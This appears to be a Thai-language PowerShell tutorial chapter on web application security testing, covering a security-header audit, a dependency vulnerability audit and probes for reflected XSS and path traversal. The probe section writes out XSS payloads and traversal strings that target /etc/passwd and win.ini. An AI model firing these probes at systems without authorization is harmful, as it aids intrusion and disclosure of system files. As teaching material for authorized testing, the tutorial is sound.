# Part 64: Web Application Security Testing

> **ระดับ**: 🔴 Advanced | **เวลา**: ~5 ชั่วโมง
>
> ⚠️ **คำเตือน**: ใช้เพื่อ Authorized Penetration Testing, CTF และการทดสอบความปลอดภัยในสภาพแวดล้อมที่เหมาะสมเท่านั้น

---

## 1. HTTP Security Headers Audit

```powershell
function Test-SecurityHeaders {
    param([string]$Url)
    
    $response = Invoke-WebRequest -Uri $Url -UseBasicParsing -Method HEAD -ErrorAction SilentlyContinue
    if (-not $response) {
        $response = Invoke-WebRequest -Uri $Url -UseBasicParsing -ErrorAction Stop
    }
    
    $headers = $response.Headers
    $checks  = @(
        @{ Header='Strict-Transport-Security'; Required=$true;  Good='max-age=31536000' }
        @{ Header='X-Frame-Options';           Required=$true;  Good='DENY or SAMEORIGIN' }
        @{ Header='X-Content-Type-Options';    Required=$true;  Good='nosniff' }
        @{ Header='Content-Security-Policy';   Required=$true;  Good="present" }
        @{ Header='X-XSS-Protection';          Required=$false; Good='1; mode=block' }
        @{ Header='Referrer-Policy';           Required=$true;  Good="present" }
        @{ Header='Permissions-Policy';        Required=$false; Good="present" }
        @{ Header='X-Powered-By';             Required=$false; Good='absent (info disclosure)' }
        @{ Header='Server';                   Required=$false; Good='absent/generic (info disclosure)' }
    )
    
    $results = foreach ($check in $checks) {
        $present = $headers.ContainsKey($check.Header)
        $value   = if ($present) { $headers[$check.Header] } else { '<missing>' }
        
        $status = if ($check.Header -in @('X-Powered-By','Server')) {
            if ($present) { 'WARN' } else { 'OK' }
        } elseif ($present) { 'OK' } else { if ($check.Required) { 'FAIL' } else { 'WARN' } }
        
        [PSCustomObject]@{
            Header   = $check.Header
            Present  = $present
            Value    = ($value -join ',').Substring(0, [Math]::Min(60, ($value -join ',').Length))
            Status   = $status
            Guidance = $check.Good
        }
    }
    
    Write-Host "`n=== Security Headers: $Url ===" -ForegroundColor Cyan
    $results | ForEach-Object {
        $color = switch ($_.Status) { 'OK' {'Green'} 'WARN' {'Yellow'} default {'Red'} }
        Write-Host "[$($_.Status)] $($_.Header): $($_.Value)" -ForegroundColor $color
    }
    return $results
}

Test-SecurityHeaders 'https://example.com'
```

---

## 2. OWASP Input Validation Tests (Authorized/CTF)

```powershell
# Test for reflected XSS (authorized testing only)
function Test-XSSReflection {
    param([string]$Url, [string]$Parameter)
    
    $payloads = @(
        '<script>alert(1)</script>'
        '"<img src=x onerror=alert(1)>'
        "'><script>alert(1)</script>"
        '<svg/onload=alert(1)>'
        'javascript:alert(1)'
    )
    
    $results = foreach ($payload in $payloads) {
        $testUrl = "$Url?$Parameter=$([Uri]::EscapeDataString($payload))"
        try {
            $res     = Invoke-WebRequest -Uri $testUrl -UseBasicParsing -ErrorAction Stop
            $found   = $res.Content -match [regex]::Escape($payload)
            [PSCustomObject]@{
                Payload  = $payload.Substring(0,30)
                Reflected= $found
                Status   = $res.StatusCode
            }
        } catch {
            [PSCustomObject]@{ Payload=$payload.Substring(0,30); Reflected=$false; Status='Error' }
        }
    }
    
    $vulnerable = $results | Where-Object { $_.Reflected }
    if ($vulnerable) {
        Write-Warning "POTENTIAL XSS: $Url parameter '$Parameter' reflects input!"
    }
    return $results
}

# Directory traversal check
function Test-PathTraversal {
    param([string]$BaseUrl, [string]$FileParam)
    
    $payloads = @(
        '../../../etc/passwd'
        '..\..\..\windows\win.ini'
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
        '....//....//....//etc/passwd'
    )
    
    foreach ($p in $payloads) {
        $url = "$BaseUrl?$FileParam=$p"
        $res = Invoke-WebRequest -Uri $url -UseBasicParsing -ErrorAction SilentlyContinue
        if ($res -and ($res.Content -match 'root:' -or $res.Content -match '\[fonts\]')) {
            Write-Warning "PATH TRAVERSAL VULNERABLE: $url"
            return $true
        }
    }
    Write-Host "Path traversal: not detected" -ForegroundColor Green
    return $false
}
```

---

## 3. Dependency Vulnerability Scanner

```powershell
function Invoke-DependencyAudit {
    param([string]$ProjectPath)
    
    $findings = @()
    
    # npm audit
    $pkgJson = Join-Path $ProjectPath 'package.json'
    if (Test-Path $pkgJson) {
        Push-Location $ProjectPath
        $npmAudit = npm audit --json 2>$null | ConvertFrom-Json
        Pop-Location
        
        foreach ($adv in $npmAudit.vulnerabilities.PSObject.Properties) {
            $v = $adv.Value
            $findings += [PSCustomObject]@{
                Type     = 'npm'
                Package  = $v.name
                Severity = $v.severity
                Via      = ($v.via | Where-Object { $_ -is [string] }) -join ','
                FixAvail = $v.fixAvailable
            }
        }
    }
    
    # .NET vulnerability check via dotnet list package
    $csproj = Get-ChildItem $ProjectPath -Filter '*.csproj' -Recurse
    if ($csproj) {
        $dotnetAudit = dotnet list $ProjectPath package --vulnerable --include-transitive 2>$null
        $vulnLines   = $dotnetAudit | Select-String 'Critical|High|Moderate|Low'
        foreach ($line in $vulnLines) {
            if ($line -match '>\s+(\S+)\s+(\S+).*?\s+(Critical|High|Moderate|Low)') {
                $findings += [PSCustomObject]@{
                    Type     = '.NET'
                    Package  = $Matches[1]
                    Version  = $Matches[2]
                    Severity = $Matches[3]
                }
            }
        }
    }
    
    $critical = $findings | Where-Object { $_.Severity -in @('critical','Critical') }
    Write-Host "Total vulnerabilities: $($findings.Count) ($($critical.Count) critical)" `
        -ForegroundColor $(if ($critical) { 'Red' } else { 'Yellow' })
    
    return $findings | Sort-Object Severity
}

$vulns = Invoke-DependencyAudit -ProjectPath './myapp'
$vulns | Format-Table -AutoSize
```

---

**ก่อนหน้า ← [Part 63](Part-63.md) | ต่อไป → [Part 65: Cloud Security](Part-65.md)**
